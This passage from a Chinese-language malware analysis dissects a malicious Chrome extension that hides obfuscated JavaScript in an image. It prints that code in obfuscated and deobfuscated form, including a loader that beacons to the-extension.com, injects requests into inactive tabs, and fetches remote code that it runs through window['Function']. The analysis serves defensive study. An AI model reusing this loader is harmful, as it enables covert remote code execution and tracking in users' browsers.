class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x26'</span></span>),'\<span class="params">x66</span>\<span class="params">x72</span>':0<span class="params">x0</span>&#125;),<span class="params">l</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x2'</span></span>)](<span class="params">[_0x1838(<span class="string">'0x27'</span></span>),'\<span class="params">x4b</span>\<span class="params">x49</span>\<span class="params">x31</span>\<span class="params">x30</span>\<span class="params">x77</span>\<span class="params">x54</span>\<span class="params">x77</span>\<span class="params">x77</span>\<span class="params">x76</span>\<span class="params">x46</span>\<span class="params">x37</span>'])['\<span class="params">x74</span>\<span class="params">x68</span>\<span class="params">x65</span>\<span class="params">x6e</span>'](<span class="params">_0x5d38a5=&gt;&#123;_0x47fce0(&#123;<span class="string">'\x63\x6f\x64\x65'</span>:_0x5d38a5[<span class="string">'\x54\x6a\x50\x7a\x6c\x38\x63\x61\x49\x34\x31'</span>],<span class="string">'\x76\x65\x72\x73\x69\x6f\x6e'</span>:_0x5d38a5[_0x1838(<span class="string">'0x28'</span></span>)]&#125;);&#125;));&#125;);&#125;<span class="params">function</span> <span class="params">a</span>(<span class="params">_0xfc65f5</span>)&#123;<span class="params">try</span>&#123;<span class="params">window</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x29'</span></span>)](<span class="params">_0xfc65f5[_0x1838(<span class="string">'0x22'</span></span>)])(<span class="params">l,n,e</span>),<span class="params">e</span>(<span class="params">_0xfc65f5[_0x1838(<span class="string">'0x22'</span></span>)]&amp;&amp;0<span class="params">x0</span>!==<span class="params">_0xfc65f5</span>['\<span class="params">x63</span>\<span class="params">x6f</span>\<span class="params">x64</span>\<span class="params">x65</span>'][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x18'</span></span>)]||<span class="params">_0xfc65f5</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x23'</span></span>)]&amp;&amp;0<span class="params">x0</span>!==<span class="params">_0xfc65f5</span>['\<span class="params">x76</span>\<span class="params">x65</span>\<span class="params">x72</span>\<span class="params">x73</span>\<span class="params">x69</span>\<span class="params">x6f</span>\<span class="params">x6e</span>'][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x18'</span></span>)]?&#123;'\<span class="params">x61</span>\<span class="params">x63</span>\<span class="params">x74</span>':'\<span class="params">x72</span>\<span class="params">x75</span>\<span class="params">x6e</span>','\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':<span class="params">_0xfc65f5</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x23'</span></span>)]&#125;:&#123;'\<span class="params">x61</span>\<span class="params">x63</span>\<span class="params">x74</span>':<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x2a'</span></span>),'\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x2b'</span></span>)&#125;);&#125;<span class="params">catch</span>(<span class="params">_0x5bd26e</span>)&#123;<span class="params">e</span>(<span class="params">&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x24'</span></span>),'\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':`<span class="params">run_$</span>&#123;<span class="params">_0xfc65f5</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x23'</span></span>)]&#125;`&#125;);&#125;&#125;<span class="params">function</span> <span class="params">r</span><span class="params">()</span>&#123;<span class="params">return</span> <span class="params">new</span> <span class="params">Promise</span>(<span class="params">(_0x223434,_0x1b9f00</span>)=&gt;</span>&#123;l[_0x1838(<span class="string">'0x2'</span>)](_0x1838(<span class="string">'0x2c'</span>))[<span class="string">'\x74\x68\x65\x6e'</span>](<span class="function"><span class="params">_0x30d294</span>=&gt;</span>&#123;<span class="keyword">let</span> _0x55a281=_0x30d294[<span class="string">'\x70\x79\x57\x35\x46\x31\x55\x34\x33\x56\x49'</span>]||<span class="number">0x0</span>;<span class="number">0x0</span>===_0x55a281&amp;&amp;l[_0x1838(<span class="string">'0x7'</span>)](&#123;<span class="string">'\x58\x4d\x57\x45\x7a\x49\x34\x53\x66\x64\x43'</span>:<span class="keyword">new</span> <span class="built_in">Date</span>()[_0x1838(<span class="string">'0x3'</span>)]()&#125;)[<span class="string">'\x74\x68\x65\x6e'</span>](<span class="function"><span class="params">_0x2d7d72</span>=&gt;</span>&#123;e(&#123;<span class="string">'\x61\x63\x74'</span>:<span class="string">'\x69\x6e\x73\x74\x61\x6c\x6c'</span>&#125;);&#125;),<span class="keyword">new</span> <span class="built_in">Date</span>()[_0x1838(<span class="string">'0x3'</span>)]()-_0x55a281&gt;c[<span class="string">'\x57\x4c'</span>][<span class="string">'\x47\x6a'</span>]?setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;n(<span class="string">`<span class="subst">$&#123;c[<span class="string">'\x57\x4c'</span>][_0x1838(<span class="string">'0x5'</span>)]&#125;</span>/?hash=jwtmv6kavksy5cazdf4leg66r`</span>,_0x1838(<span class="string">'0x8'</span>))[_0x1838(<span class="string">'0x1'</span>)](o)[_0x1838(<span class="string">'0x1'</span>)](_0x223434);&#125;,c[<span class="string">'\x66\x4d'</span>]):l[_0x1838(<span class="string">'0x2'</span>)]([_0x1838(<span class="string">'0x27'</span>),_0x1838(<span class="string">'0x28'</span>)])[_0x1838(<span class="string">'0x1'</span>)](<span class="function"><span class="params">_0x1d2d5e</span>=&gt;</span>&#123;_0x223434(&#123;<span class="string">'\x63\x6f\x64\x65'</span>:_0x1d2d5e[_0x1838(<span class="string">'0x27'</span>)],<span class="string">'\x76\x65\x72\x73\x69\x6f\x6e'</span>:_0x1d2d5e[<span class="string">'\x4b\x49\x31\x30\x77\x54\x77\x77\x76\x46\x37'</span>]&#125;);&#125;);&#125;);&#125;);&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span>&#123;setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e(&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x2d'</span>)&#125;),r()[_0x1838(<span class="string">'0x1'</span>)](a);&#125;,c[<span class="string">'\x43\x66'</span>]);&#125;<span class="keyword">let</span> c=&#123;<span class="string">'\x57\x4c'</span>:&#123;<span class="string">'\x75\x72\x6c'</span>:_0x1838(<span class="string">'0x2e'</span>),<span class="string">'\x47\x6a'</span>:<span class="number">0x2932e00</span>&#125;,<span class="string">'\x4e\x5a'</span>:<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1d'</span>)](<span class="number">0x3</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1e'</span>)]()),<span class="string">'\x66\x4d'</span>:<span class="number">0x1b7740</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1d'</span>)](<span class="number">0x1</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1e'</span>)]()+<span class="number">0x1</span>),<span class="string">'\x43\x66'</span>:<span class="number">0xea60</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1d'</span>)](<span class="number">0x2</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1e'</span>)]()+<span class="number">0x1</span>),<span class="string">'\x46\x44'</span>:<span class="number">0x7</span>&#125;,l=&#123;<span class="string">'\x67\x65\x74'</span>(e=<span class="literal">null</span>)&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">_0x459136,_0x1dd2d2</span>)=&gt;</span>&#123;chrome[_0x1838(<span class="string">'0x30'</span>)][_0x1838(<span class="string">'0x2f'</span>)][_0x1838(<span class="string">'0x2'</span>)](e,<span class="function"><span class="keyword">function</span>(<span class="params">_0x49e268</span>)</span>&#123;_0x459136(_0x49e268);&#125;);&#125;);&#125;,<span class="string">'\x73\x65\x74'</span>(_0x1054f4)&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">_0x13679c,_0x5182a6</span>)=&gt;</span>&#123;chrome[_0x1838(<span class="string">'0x30'</span>)][<span class="string">'\x6c\x6f\x63\x61\x6c'</span>][_0x1838(<span class="string">'0x7'</span>)](_0x1054f4,<span class="function"><span class="keyword">function</span>(<span class="params">_0x154ca1</span>)</span>&#123;_0x13679c(_0x154ca1);&#125;);&#125;);&#125;,<span class="string">'\x79\x4a'</span>(_0x21744e)&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">_0x23501d,_0x525375</span>)=&gt;</span>&#123;chrome[_0x1838(<span class="string">'0x30'</span>)][_0x1838(<span class="string">'0x2f'</span>)][<span class="string">'\x79\x4a'</span>](_0x21744e,<span class="function"><span class="keyword">function</span>(<span class="params">_0x298d92</span>)</span>&#123;_0x23501d(_0x298d92);&#125;);&#125;);&#125;,<span class="string">'\x45\x45'</span>()&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">_0x47a45d,_0x110900</span>)=&gt;</span>&#123;chrome[_0x1838(<span class="string">'0x30'</span>)][_0x1838(<span class="string">'0x2f'</span>)][<span class="string">'\x45\x45'</span>](<span class="function"><span class="keyword">function</span>(<span class="params">_0x25822d</span>)</span>&#123;_0x47a45d(_0x25822d);&#125;);&#125;);&#125;&#125;;i();&#125;)()</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<p>很明显，这段js代码是经过深度混淆过的。</p>
<p>然后，通过<code>document.defaultView</code>的方式来执行从图片解析出来的javascript代码。</p>
<p>下面需要几个知识</p>
<p>1.<code>javascript</code>中这两种调用方法是一样的。<code>chrome.runtime.onMessage</code>和<code>chrome[&quot;runtime&quot;][&quot;onMessage&quot;]</code></p>
<p>2.<code>=&gt;</code>这个符号是ES6的特性，代表匿名ES函数</p>
<p>3.Promise为承诺，ES6的新特性已经被大多数浏览器支持</p>
<h2 id="图片中隐藏的js分析"><a href="#图片中隐藏的js分析" class="headerlink" title="图片中隐藏的js分析"></a>图片中隐藏的js分析</h2><p>这段javascript用了大量的Promise对象，用了大量的<code>=&gt;</code>这样的匿名函数，函数名用了<code>&quot;\x63\x6f\x64\x65&quot;</code>这种ascii码的16进制作为函数名，且使用了<code>chrome[&quot;runtime&quot;][&quot;onMessage&quot;]</code>这种调用的方式。</p>
<p>首先<code>_0x2126</code>是一个字符串数组，数组内的数据在之后的js代码中被大量引用作为函数名。不过这个数组在<code>function t</code>函数中被重新排序了，排序后的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">_0x2126 = ["eval", "then", "get", "getTime", "setUTCHours", "url", "origin", "<span class="keyword">set</span><span class="string">", "</span><span class="keyword">GET</span><span class="string">", "</span>loading<span class="string">", "</span><span class="keyword">status</span><span class="string">", "</span>removeListener<span class="string">", "</span>onUpdated<span class="string">", "</span>tabs<span class="string">", "</span>callee<span class="string">", "</span>addListener<span class="string">", "</span>onMessage<span class="string">", "</span>runtime<span class="string">", "</span>executeScript<span class="string">", "</span><span class="keyword">replace</span><span class="string">", "</span><span class="keyword">data</span><span class="string">", "</span><span class="keyword">test</span><span class="string">", "</span>includes<span class="string">", "</span><span class="keyword">http</span>://<span class="string">", "</span><span class="keyword">length</span><span class="string">", "</span><span class="keyword">Url</span> <span class="keyword">error</span><span class="string">", "</span><span class="keyword">query</span><span class="string">", "</span>filter<span class="string">", "</span>active<span class="string">", "</span><span class="keyword">floor</span><span class="string">", "</span>random<span class="string">", "</span>charCodeAt<span class="string">", "</span>fromCharCode<span class="string">", "</span><span class="keyword">parse</span><span class="string">", "</span>code<span class="string">", "</span><span class="keyword">version</span><span class="string">", "</span><span class="keyword">error</span><span class="string">", "</span>download<span class="string">", "</span>invalidMonetizationCode<span class="string">", "</span>TjPzl8caI41<span class="string">", "</span>KI10wTwwvF7<span class="string">", "</span><span class="keyword">Function</span><span class="string">", "</span>run<span class="string">", "</span>idle<span class="string">", "</span>pyW5F1U43VI<span class="string">", "</span>init<span class="string">", "</span>https://the-extension.com<span class="string">", "</span><span class="keyword">local</span><span class="string">", "</span><span class="keyword">storage</span><span class="string">"]</span></div></pre></td></tr></table></figure>
<p>这个数组中的数据在之后被作为函数名来调用相关的函数。<code>_0x1838(&#39;0x30&#39;)</code>其实就是取<code>_0x2126</code>中第0x30个元素，也就是<code>local</code>。</p>
<p>function t 就是用来对<code>_0x2126</code>这个list进行重新排序的函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params">_0x474bb1, _0x4cc1c1</span>) </span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x36e242 = <span class="string">''</span>,</div><div class="line">    _0x35971b = <span class="number">0x0</span>,</div><div class="line">    _0x519d9f = <span class="number">0x0</span>; _0x519d9f &lt; _0x474bb1[<span class="string">'length'</span>]; _0x519d9f++) </div><div class="line">        _0x35971b = _0x474bb1[_0x519d9f][<span class="string">"charCodeAt"</span>]() + _0x4cc1c1,</div><div class="line">        _0x36e242 += <span class="built_in">String</span>[<span class="string">"fromCharCode"</span>](_0x35971b);</div><div class="line">    <span class="keyword">return</span> _0x36e242;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function e 主要作用是post数据，更新执行的步骤</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params">&#123;</span></span></div><div class="line">    cat = <span class="string">"eval"</span>,</div><div class="line">    act = <span class="string">''</span>,</div><div class="line">    lab = <span class="string">''</span>,</div><div class="line">    fr = <span class="number">0x3e8</span> * <span class="number">0x3c</span> * <span class="number">0x3c</span> * <span class="number">0x18</span></div><div class="line">&#125;) &#123;</div><div class="line">    <span class="keyword">let</span> _0x4b1721 = t(<span class="string">`$ &#123;</span></div><div class="line">        cat</div><div class="line">    &#125;</div><div class="line">    _$ &#123;</div><div class="line">        act</div><div class="line">    &#125;`, c[<span class="string">'FD'</span>]);</div><div class="line">    <span class="keyword">return</span> l[<span class="string">'get'</span>](_0x4b1721)[<span class="string">"then"</span>](_0x9415ed = &gt;&#123;</div><div class="line">        <span class="keyword">let</span> _0x5d937f = _0x9415ed[_0x4b1721],</div><div class="line">        _0x45c15f = <span class="number">0x5265c00</span> == fr ? <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]() - <span class="keyword">new</span> <span class="built_in">Date</span>(_0x5d937f)[<span class="string">"setUTCHours"</span>](<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>) &gt;= fr: <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]() - _0x5d937f &gt;= fr; <span class="comment">// 一定的时间下才会执行</span></div><div class="line">        <span class="keyword">if</span> (!_0x5d937f || _0x45c15f) &#123;</div><div class="line">            <span class="keyword">let</span> _0x9415ed = <span class="string">`$ &#123;</span></div><div class="line">                new URL(c['WL']["url"])["origin"]</div><div class="line">            &#125; /stats`;</div><div class="line"> <span class="comment">//https://the-extension.com/stats?hash=jwtmv6kavksy5cazdf4leg66r&amp;eventCategory=eval&amp;eventAction=init&amp;eventLabel=</span></div><div class="line">n(<span class="string">`<span class="subst">$&#123;_0x9415ed&#125;</span>hash=jwtmv6kavksy5cazdf4leg66r&amp;eventCategory=<span class="subst">$&#123;cat&#125;</span>&amp;eventAction=<span class="subst">$&#123;act&#125;</span>&amp;eventLabel=<span class="subst">$&#123;lab&#125;</span>`</span>,<span class="string">'POST'</span>)[<span class="string">'then'</span>](<span class="function"><span class="params">_0x201de8</span>=&gt;</span>&#123;<span class="keyword">let</span> _0x9415ed=&#123;&#125;;_0x9415ed[_0x4b1721]=<span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>](),l[<span class="string">"set"</span>](_0x9415ed);&#125;);&#125;&#125;);&#125;</div></pre></td></tr></table></figure>
<p>比如，恶意js在init的时候，此时发送的请求如下</p>
<p><img src="5.png" alt=""></p>
<p><img src="6.png" alt=""></p>
<p>响应的请求</p>
<p>function n 主要是完成了一个xhr请求，通过<code>executeScript</code>来完成。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params">_0x42ba8f, n = “GET”</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x3090bd, _0x473358) = &gt;&#123;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x3ad6d4</span>(<span class="params">_0x3a3304, _0x4cce31, _0x57e5fb</span>) </span>&#123;</div><div class="line">            <span class="string">"loading"</span> === _0x4cce31[<span class="string">"status"</span>] &amp;&amp; (_0x20f3c8(_0x57e5fb, _0x42ba8f) &amp;&amp; c[<span class="string">'NZ'</span>] &lt;= <span class="number">0x0</span> &amp;&amp; (chrome[<span class="string">"tabs"</span>][<span class="string">"onUpdated"</span>][<span class="string">"removeListener"</span>](<span class="built_in">arguments</span>[<span class="string">"callee"</span>]), _0x2bc9ef(_0x3a3304)), c[<span class="string">'NZ'</span>]--);</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x2bc9ef</span>(<span class="params">_0x5a3411</span>) </span>&#123;</div><div class="line">            chrome[<span class="string">"runtime"</span>][<span class="string">"onMessage"</span>][<span class="string">"addListener"</span>](_0x4b297c),</div><div class="line">            chrome[<span class="string">"tabs"</span>][<span class="string">"executeScript"</span>](_0x5a3411, &#123;</div><div class="line">                <span class="string">'code'</span>: <span class="string">` (function() &#123;</span></div><div class="line">                    var url = replaceableurl;</div><div class="line">                    var xhr = new XMLHttpRequest();</div><div class="line">                    xhr.onreadystatechange = function() &#123;</div><div class="line">                        if (xhr.readyState === 4) &#123;</div><div class="line">                            chrome.runtime.sendMessage(&#123;</div><div class="line">                                data: xhr.responseText,</div><div class="line">                                url: url,</div><div class="line">                                status: xhr.status</div><div class="line">                            &#125;);</div><div class="line">                        &#125;</div><div class="line">                    &#125;;</div><div class="line">                    xhr.open('<span class="subst">$&#123;n&#125;</span>', url, true);</div><div class="line">                    xhr.send();</div><div class="line">                &#125;)()` [<span class="string">"replace"</span>](<span class="string">'replaceableurl'</span>, <span class="string">`'<span class="subst">$&#123;_0x42ba8f&#125;</span>'`</span>)</div><div class="line">            &#125;);</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x4b297c</span>(<span class="params">_0x4a051f</span>) </span>&#123;</div><div class="line">            _0x4a051f[<span class="string">"url"</span>] === _0x42ba8f &amp;&amp; (_0x3090bd(_0x4a051f[<span class="string">"data"</span>]), chrome[<span class="string">"runtime"</span>][<span class="string">"onMessage"</span>][<span class="string">'removeListener'</span>](<span class="built_in">arguments</span>[<span class="string">"callee"</span>]));</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x20f3c8</span>(<span class="params">_0x45a021, _0x3db6fb</span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">` ^ (( ? !(chrome$ &#123;</span></div><div class="line">                _0x3db6fb["includes"]("http://") ? '|https|ftps': ''</div><div class="line">            &#125;)). + : //)`)[<span class="string">"test"</span>](_0x45a021[<span class="string">"url"</span>]);&#125;_0x42ba8f&amp;&amp;<span class="number">0x0</span>!==_0x42ba8f[<span class="string">'length'</span>]||_0x473358(<span class="string">"Url error"</span>),chrome[<span class="string">"tabs"</span>][<span class="string">"query"</span>](&#123;&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">_0x26d445</span>)</span>&#123;<span class="keyword">let</span> _0x3090bd=_0x26d445[<span class="string">"filter"</span>](<span class="function"><span class="params">_0x1c9951</span>=&gt;</span>_0x20f3c8(_0x1c9951,_0x42ba8f)&amp;&amp;!_0x1c9951[<span class="string">'active'</span>]);<span class="number">0x0</span>===_0x3090bd[<span class="string">"length"</span>]?chrome[<span class="string">"tabs"</span>][<span class="string">"onUpdated"</span>][<span class="string">"addListener"</span>](_0x3ad6d4):_0x2bc9ef(_0x3090bd[<span class="built_in">Math</span>[<span class="string">"floor"</span>](<span class="built_in">Math</span>[<span class="string">'random'</span>]()*_0x3090bd[<span class="string">"length"</span>])][<span class="string">'id'</span>]);&#125;);&#125;);&#125;</div></pre></td></tr></table></figure>
<p>function o 用于解析返回的js代码，取出其中的code和version字段，并通过l.set方法持久化存储到本地。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params">_0xcaa92b</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x47fce0, _0x349364) = &gt;&#123;</div><div class="line">        <span class="keyword">let</span> _0x51ae9e = !<span class="number">0x1</span>,</div><div class="line">        _0x556fe3 = <span class="string">''</span>,</div><div class="line">        _0x58bf0d = <span class="string">''</span>;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            _0xcaa92b = <span class="built_in">JSON</span>[<span class="string">"parse"</span>](_0xcaa92b),</div><div class="line">            _0x556fe3 = _0xcaa92b[<span class="string">"code"</span>],</div><div class="line">            _0x58bf0d = _0xcaa92b[<span class="string">"version"</span>],</div><div class="line">            _0x556fe3 == <span class="number">-0x1</span> || (_0x51ae9e = !<span class="number">0x0</span>);</div><div class="line">        &#125; <span class="keyword">catch</span>(_0x1b0f96) &#123;</div><div class="line">            e(&#123;</div><div class="line">                <span class="string">"act"</span>: <span class="string">"error"</span>,</div><div class="line">                <span class="string">"lab"</span>: <span class="string">"parseResponse"</span>,</div><div class="line">                <span class="string">"fr"</span>: <span class="number">0x0</span></div><div class="line">            &#125;);</div><div class="line">        &#125;</div><div class="line">        _0x51ae9e ? l[<span class="string">"set"</span>](&#123;</div><div class="line">            <span class="string">"TjPzl8caI41"</span>: _0x556fe3,</div><div class="line">            <span class="string">"KI10wTwwvF7"</span>: _0x58bf0d</div><div class="line">        &#125;)[<span class="string">"then"</span>](_0x207847 = &gt;&#123;</div><div class="line">            l[<span class="string">"set"</span>](&#123;</div><div class="line">                <span class="string">"pyW5F1U43VI"</span>: <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]()</div><div class="line">            &#125;),</div><div class="line">            e(&#123;</div><div class="line">                <span class="string">"act"</span>: <span class="string">"download"</span>,</div><div class="line">                <span class="string">"lab"</span>: _0x58bf0d,</div><div class="line">                <span class="string">"fr"</span>: <span class="number">0x0</span></div><div class="line">            &#125;),</div><div class="line">            _0x47fce0(&#123;</div><div class="line">                <span class="string">"code"</span>: _0x556fe3,</div><div class="line">                <span class="string">"version"</span>: _0x58bf0d</div><div class="line">            &#125;);</div><div class="line">        &#125;) : (_0x556fe3 != <span class="number">-0x1</span> &amp;&amp; e(&#123;</div><div class="line">            <span class="string">"act"</span>: <span class="string">"error"</span>,</div><div class="line">            <span class="string">"lab"</span>: <span class="string">"invalidMonetizationCode"</span>,</div><div class="line">            <span class="string">"fr"</span>: <span class="number">0x0</span></div><div class="line">        &#125;), l[<span class="string">"get"</span>]([<span class="string">"TjPzl8caI41"</span>, <span class="string">"KI10wTwwvF7"</span>])[<span class="string">"then"</span>](_0x5d38a5 = &gt;&#123;</div><div class="line">            _0x47fce0(&#123;</div><div class="line">                <span class="string">"code"</span>: _0x5d38a5[<span class="string">"TjPzl8caI41"</span>],</div><div class="line">                <span class="string">"version"</span>: _0x5d38a5[<span class="string">"KI10wTwwvF7"</span>]</div><div class="line">            &#125;);</div><div class="line">        &#125;));</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function a 更新插件运行状态</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">_0xfc65f5</span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="built_in">window</span>[<span class="string">"Function"</span>](_0xfc65f5[<span class="string">"code"</span>])(l, n, e),</div><div class="line">        e(_0xfc65f5[<span class="string">"code"</span>] &amp;&amp; <span class="number">0x0</span> !== _0xfc65f5[<span class="string">'code'</span>][<span class="string">"length"</span>] || _0xfc65f5[<span class="string">"version"</span>] &amp;&amp; <span class="number">0x0</span> !== _0xfc65f5[<span class="string">'version'</span>][<span class="string">"length"</span>] ? &#123;</div><div class="line">            <span class="string">'act'</span>: <span class="string">'run'</span>,</div><div class="line">            <span class="string">'lab'</span>: _0xfc65f5[<span class="string">"version"</span>]</div><div class="line">        &#125;: &#123;</div><div class="line">            <span class="string">'act'</span>: <span class="string">"run"</span>,</div><div class="line">            <span class="string">'lab'</span>: <span class="string">"idle"</span></div><div class="line">        &#125;);</div><div class="line">    &#125; <span class="keyword">catch</span>(_0x5bd26e) &#123;</div><div class="line">        e(&#123;</div><div class="line">            <span class="string">'act'</span>: <span class="string">"error"</span>,</div><div class="line">            <span class="string">'lab'</span>: <span class="string">`run_$ &#123;</span></div><div class="line">                _0xfc65f5["version"]</div><div class="line">            &#125;`</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function i 为入口函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        e(&#123;</div><div class="line">            <span class="string">'act'</span>: <span class="string">"init"</span></div><div class="line">        &#125;),</div><div class="line">        r()[<span class="string">"then"</span>](a);</div><div class="line">    &#125;,</div><div class="line">    c[<span class="string">'Cf'</span>]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function r 是用来下载执行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x223434, _0x1b9f00) = &gt;&#123;</div><div class="line">        l[<span class="string">"get"</span>](<span class="string">"pyW5F1U43VI"</span>)[<span class="string">'then'</span>](_0x30d294 = &gt;&#123;</div><div class="line">            <span class="keyword">let</span> _0x55a281 = _0x30d294[<span class="string">'pyW5F1U43VI'</span>] || <span class="number">0x0</span>;</div><div class="line">            <span class="number">0x0</span> === _0x55a281 &amp;&amp; l[<span class="string">"set"</span>](&#123;</div><div class="line">                <span class="string">'XMWEzI4SfdC'</span>: <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]()</div><div class="line">            &#125;)[<span class="string">'then'</span>](_0x2d7d72 = &gt;&#123;</div><div class="line">                e(&#123;</div><div class="line">                    <span class="string">'act'</span>: <span class="string">'install'</span></div><div class="line">                &#125;);</div><div class="line">            &#125;),</div><div class="line">            <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]() - _0x55a281 &gt; c[<span class="string">'WL'</span>][<span class="string">'Gj'</span>] ? setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                n(<span class="string">`$ &#123;c['WL']["url"]&#125;/?hash=jwtmv6kavksy5cazdf4leg66r`</span>,<span class="string">"GET"</span>)[<span class="string">"then"</span>](o)[<span class="string">"then"</span>](_0x223434);&#125;,c[<span class="string">'fM'</span>]):l[<span class="string">"get"</span>]([<span class="string">"TjPzl8caI41"</span>,<span class="string">"KI10wTwwvF7"</span>])[<span class="string">"then"</span>](<span class="function"><span class="params">_0x1d2d5e</span>=&gt;</span>&#123;_0x223434(&#123;<span class="string">'code'</span>:_0x1d2d5e[<span class="string">"TjPzl8caI41"</span>],<span class="string">'version'</span>:_0x1d2d5e[<span class="string">'KI10wTwwvF7'</span>]&#125;);&#125;);&#125;);&#125;);&#125;</div></pre></td></tr></table></figure>
<p>这段js里面有一个比较重要的变量c</p>
<p><img src="4.png" alt=""></p>
<p>还有一个 重要的l，l包含了四个函数<code>EE</code>,<code>get</code>,<code>set</code>,<code>Yj</code></p>
<p>function EE</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">EE() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x47a45d, _0x110900) = &gt;&#123;</div><div class="line">        chrome[<span class="string">'storage'</span>][<span class="string">'local'</span>][<span class="string">'EE'</span>](<span class="function"><span class="keyword">function</span>(<span class="params">_0x25822d</span>) </span>&#123;</div><div class="line">            _0x47a45d(_0x25822d);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function get  用于从存储的文件中取数据</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">get(e = <span class="literal">null</span>) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x459136, _0x1dd2d2) = &gt;&#123;</div><div class="line">        chrome[<span class="string">'storage'</span>][<span class="string">'local'</span>][<span class="string">'get'</span>](e,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_0x49e268</span>) </span>&#123;</div><div class="line">            _0x459136(_0x49e268);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function set 用于将数据写入到存储文件中</p>
